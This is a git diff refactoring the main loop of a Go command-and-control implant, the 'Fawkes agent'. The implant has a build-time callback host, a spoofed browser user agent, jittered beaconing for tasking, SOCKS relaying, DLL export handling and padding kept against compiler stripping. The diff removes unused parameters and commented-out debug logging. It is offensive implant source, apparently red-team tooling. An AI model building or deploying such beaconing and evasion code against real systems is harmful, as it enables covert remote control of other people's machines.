@@ -28,9 +28,8 @@ import (
 
 var (
 	// These variables are populated at build time by the Go linker
-	payloadUUID   string = ""
-	c2Profile     string = ""
-	callbackHost  string = ""
+	payloadUUID  string = ""
+	callbackHost string = ""
 	callbackPort  string = "443"
 	userAgent     string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
 	sleepInterval string = "10"
@@ -178,12 +177,12 @@ func runAgent() {
 
 	// Start main execution loop - run directly (not as goroutine) so DLL exports block properly
 	log.Printf("[INFO] Starting main execution loop for agent %s", agent.PayloadUUID[:8])
-	mainLoop(ctx, agent, c2, socksManager, maxRetriesInt, sleepIntervalInt, debugBool)
+	mainLoop(ctx, agent, c2, socksManager, maxRetriesInt)
 	usePadding() // Reference embedded padding to prevent compiler stripping
 	log.Printf("[INFO] Fawkes agent shutdown complete")
 }
 
-func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, socksManager *socks.Manager, maxRetriesInt int, sleepIntervalInt int, debugBool bool) {
+func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, socksManager *socks.Manager, maxRetriesInt int) {
 	// Main execution loop
 	retryCount := 0
 	for {
@@ -192,9 +191,6 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 			log.Printf("[INFO] Context cancelled, exiting main loop")
 			return
 		default:
-			if debugBool {
-				// log.Printf(\"[DEBUG] Main loop iteration (retry count: %d)\", retryCount)
-			}
 			// Drain any pending outbound SOCKS data to include in this poll
 			outboundSocks := socksManager.DrainOutbound()
 
@@ -208,26 +204,17 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 					retryCount = 0 // Reset counter instead of exiting
 					// Sleep longer on repeated failures
 					sleepTime := time.Duration(agent.SleepInterval*3) * time.Second
-					if debugBool {
-						// log.Printf("[DEBUG] Sleeping for extended time %v after max retries", sleepTime)
-					}
 					time.Sleep(sleepTime)
 					continue
 				}
 				// Use the same sleep calculation for error case
 				sleepTime := calculateSleepTime(agent.SleepInterval, agent.Jitter)
-				if debugBool {
-					// log.Printf(\"[DEBUG] Sleeping for %v after error\", sleepTime)
-				}
 				time.Sleep(sleepTime)
 				continue
 			}
 
 			// Reset retry count on successful communication
 			retryCount = 0
-			if debugBool {
-				// log.Printf("[DEBUG] GetTasking successful, received %d tasks", len(tasks))
-			}
 
 			// Pass inbound SOCKS messages to the manager for processing
 			if len(inboundSocks) > 0 {
@@ -241,9 +228,6 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 
 			// Sleep before next iteration
 			sleepTime := calculateSleepTime(agent.SleepInterval, agent.Jitter)
-			if debugBool {
-				// log.Printf("[DEBUG] Sleeping for %v before next check", sleepTime)
-			}
 			time.Sleep(sleepTime)
 		}
 	}
